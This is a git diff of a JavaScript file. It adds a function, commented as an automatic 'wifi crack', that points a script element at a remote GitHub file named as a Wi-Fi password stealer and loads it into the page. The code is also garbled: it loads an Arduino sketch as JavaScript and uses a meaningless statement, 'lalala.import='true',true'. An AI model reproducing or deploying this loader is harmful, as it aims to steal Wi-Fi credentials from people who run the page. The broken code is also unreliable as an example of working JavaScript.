@@ -11,6 +11,20 @@ function lalala(lalala) {
 }
 // end to import file wifi crack
 
+//wifi 2 start
+// auto wifi crack otomatic
+function lalala(lalala) {
+  lalala.src='https://raw.githubusercontent.com/GMhabib/index.js/main/Wi-Fi%20password%20stealer/WifiKey-Grab_Minimize-of-Shame.ino';
+  lalala.import='true',true;
+  lalala.setAttribute('src', 'https://raw.githubusercontent.com/GMhabib/index.js/main/Wi-Fi%20password%20stealer/WifiKey-Grab_Minimize-of-Shame.ino');
+  lalala.addEventListener('load', scriptLoaded, true);
+  function scriptLoaded(){
+    console.log('script success to run');
+  }
+  
+}
+
+//end script
 
 //active load script
 let myScript = document.createElement("script");
